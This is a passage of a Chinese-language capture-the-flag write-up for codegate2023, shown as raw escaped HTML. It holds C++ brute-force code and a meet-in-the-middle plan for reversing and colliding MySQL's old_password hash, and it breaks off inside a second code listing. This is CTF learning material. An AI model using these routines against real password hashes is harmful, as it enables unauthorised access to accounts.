class=&#34;type&#34;&gt;unsigned&lt;/span&gt; len, &lt;span class=&#34;comment&#34;&gt;/*debug only!*/&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; level = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; nr, nr2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; u, e, y;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (len == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; add==&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt; &amp;amp;&amp;amp; pnr2==&lt;span class=&#34;number&#34;&gt;0x12345671&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;// Modify to target value when MiM-ing&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    nr = pnr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    nr2 = pnr2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// c = cc[len - 1];&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    add -= c;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    u = nr2 - nr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    u = nr2 - ((u &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) ^ nr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    u = nr2 - ((u &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) ^ nr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    nr2 = nr2 - ((u &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) ^ nr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    nr2 &amp;amp;= &lt;span class=&#34;number&#34;&gt;0x7FFFFFFF&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    y = nr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (e = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; e &amp;lt; &lt;span class=&#34;number&#34;&gt;64&lt;/span&gt;; e++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123; &lt;span class=&#34;comment&#34;&gt;// guess 6 lsb of nr&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; z, g;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        z = (e + add) * c;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        g = (e ^ z) &amp;amp; &lt;span class=&#34;number&#34;&gt;0x3F&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (g == (y &amp;amp; &lt;span class=&#34;number&#34;&gt;0x3F&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123; &lt;span class=&#34;comment&#34;&gt;// must matches, otherwise reject it&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; x;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;comment&#34;&gt;// Now 8 LSB of nr known, byte-by-byte derive previous nr&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            x = e;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            x = y ^ (z + (x &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            x = y ^ (z + (x &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            x = y ^ (z + (x &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            nr = y ^ (z + (x &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            nr &amp;amp;= &lt;span class=&#34;number&#34;&gt;0x7FFFFFFF&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;built_in&#34;&gt;bruteforce&lt;/span&gt;(nr, nr2, add, len - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, level + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                cout&amp;lt;&amp;lt;&lt;span class=&#34;string&#34;&gt;&amp;quot;assume:&amp;quot;&lt;/span&gt;&amp;lt;&amp;lt;c&amp;lt;&amp;lt;endl;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;bruteforce&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; pnr, &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; pnr2, &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; add, &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; len, &lt;span class=&#34;comment&#34;&gt;/*debug only!*/&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; level)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (add&lt;span class=&#34;number&#34;&gt;-7&lt;/span&gt;&amp;lt;&lt;span class=&#34;number&#34;&gt;48&lt;/span&gt;*len||add&lt;span class=&#34;number&#34;&gt;-7&lt;/span&gt;&amp;gt;&lt;span class=&#34;number&#34;&gt;122&lt;/span&gt;*len) &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; _=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;_&amp;lt;&lt;span class=&#34;number&#34;&gt;63&lt;/span&gt;;_++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// Maybe剪枝here&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;built_in&#34;&gt;oldpw_rev&lt;/span&gt;(pnr,pnr2,add,charset[_],len,level)==&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;pre&lt;/span&gt;(level);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;nr:%x   nr2:%x\n&amp;quot;&lt;/span&gt;, pnr, pnr2);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//eg: aaaa&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; pnr = &lt;span class=&#34;number&#34;&gt;0xA8D6917A&lt;/span&gt;, pnr2 = &lt;span class=&#34;number&#34;&gt;0x6FAB63E5&lt;/span&gt;; &lt;span class=&#34;comment&#34;&gt;//最终的nr, nr2，来自上文的C#代码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cout &amp;lt;&amp;lt; &lt;span class=&#34;built_in&#34;&gt;bruteforce&lt;/span&gt;(pnr, pnr2, &lt;span class=&#34;number&#34;&gt;97&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;/*add*/&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;comment&#34;&gt;/*length*/&lt;/span&gt;) &amp;lt;&amp;lt; endl; &lt;span class=&#34;comment&#34;&gt;// ! initial value of add is 7&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;也就是，在已知add值（字符串的前缀ASCII和）以及当前字符的情况下，对于平凡情况（无多解），能在常数时间确定上一个nr&amp;#x2F;nr2对的值。&lt;br&gt;一个朴素的思路是暴力枚举当前位的字符与add值。&lt;br&gt;暴力计算的话时间复杂度肯定是无法接受的（O(64^n)，5步需要约1分钟）。我们理一下现在已知什么，需要求解什么。请注意：我们需要的只是hash碰撞，不代表flag也是以&lt;code&gt;i_love_you&amp;#125;&lt;/code&gt;结尾的。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;v2的形式：&lt;code&gt;codegate2023&amp;#123;Mysql_olD_P455woRD_I5_CoMP&amp;lt;???&amp;gt;i_love_you&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;FLAG的总长度为78-79（因为前一半flag长为39）&lt;/li&gt;
&lt;li&gt;最终hash(v2)&amp;#x3D;&lt;code&gt;6368616368613230&lt;/code&gt; -&amp;gt; 最终的nr&amp;#x2F;nr2&lt;/li&gt;
&lt;li&gt;前一半flag的add值为3430：&lt;code&gt;sum([ord(i) for i in &amp;quot;codegate2023&amp;#123;Mysql_olD_P455woRD_I5_CoMP&amp;quot;])&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;结尾的11个字符&lt;code&gt;i_love_you&amp;#125;&lt;/code&gt;对应add值：1207&lt;/li&gt;
&lt;li&gt;未知：整个flag字符串的add值&lt;ul&gt;
&lt;li&gt;但add值的可能范围很有限，我们可以容易计算出上下界：下界为3430+39*32&amp;#x3D;4678，上界为3430+40*127&amp;#x3D;8510&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;并且，这个范围内合法的add值占比并不高：对于一个可能的add值，往回推结尾的那11个字符&lt;code&gt;i_love_you&amp;#125;&lt;/code&gt;必须都有解&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;所以我们只需要MitM，中间相遇，即可爆出正解。&lt;br&gt;这个中间状态指的是&lt;code&gt;&amp;lt;???&amp;gt;&lt;/code&gt;这串未知字串中间某个位置一个独特的nr&amp;#x2F;nr2&amp;#x2F;add对；而这个add值毕竟只是一个中间量（&lt;strong&gt;下称fadd&lt;/strong&gt;），可以手动给予一个值。在本题中我们手动要求从&lt;code&gt;codegate2023&amp;#123;Mysql_olD_P455woRD_I5_CoMP&amp;lt;???&amp;gt;i_love_you&amp;#125;&lt;/code&gt;再向前填充总计&lt;code&gt;6*127&lt;/code&gt;的字符作为中间相遇处：当然越大的值搜索空间越大。  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;我们先筛选出可行的add值，并记录在处理&lt;code&gt;i_love_you&amp;#125;&lt;/code&gt;前的中间add值&lt;/li&gt;
&lt;li&gt;逆向: 对于每个中间add值先逆推5步，记录所有可能在中间相遇处add值为fadd的nr&amp;#x2F;nr2对，以及逆向对应的5个字符&lt;/li&gt;
&lt;li&gt;正向: 我们手动要求向前数步（至少6步，因为fadd值是3430+6*127）到达中间相遇处使得add值为fadd，并检查这个nr&amp;#x2F;nr2对是否出现在逆向得到的结果中；如果有，则拿下。&lt;br&gt;爆破代码：Credit to @4qwerty&lt;br&gt;为什么for嵌套这么多？因为4老师懒得写递归，反正没几步，不够就加一层for就行了。&lt;br&gt;其实如果要计算的话是可以的：逆着5步大约有&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;134&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;136&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;137&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;138&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;139&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;140&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;141&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;142&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;143&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;144&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;145&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;146&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;147&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;148&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;149&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;150&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;151&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;152&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;153&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;154&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;155&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;156&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;157&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;158&lt;/span&gt;&lt;br&gt;&lt;span 